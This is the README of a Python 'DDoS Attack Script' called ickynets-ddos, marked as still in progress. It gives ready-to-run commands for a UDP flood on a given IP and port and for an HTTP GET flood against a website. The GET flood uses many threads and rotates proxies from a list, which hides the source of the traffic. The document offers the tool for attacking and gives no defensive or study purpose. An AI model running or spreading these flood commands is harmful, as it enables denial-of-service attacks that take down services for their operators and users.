<center><a href="https://ibb.co/yS4sxZW"><img src="https://i.ibb.co/yS4sxZW/maxresdefault.jpg" alt="maxresdefault" border="0"></a></center>

<h1 align="center">ickynets-ddos - DDoS Attack Script</h1>
<em><h5 align="center">(Programming Language - Python 3)</h5></em>

#still in progress

💡 Example 1: Layer 4 Attack (UDP)

python3 main.py UDP 192.168.1.100 80 50 --duration 30

This launches a UDP flood on IP 192.168.1.100, port 80, with 50 threads for 30 seconds.

💡 Example 2: Layer 7 Attack (GET) with Proxy

python3 main.py GET example.com 80 100 --duration 60 --use-proxy

This sends HTTP GET requests to http://example.com:80 using 100 threads for 60 seconds, rotating through proxies from proxies.txt.
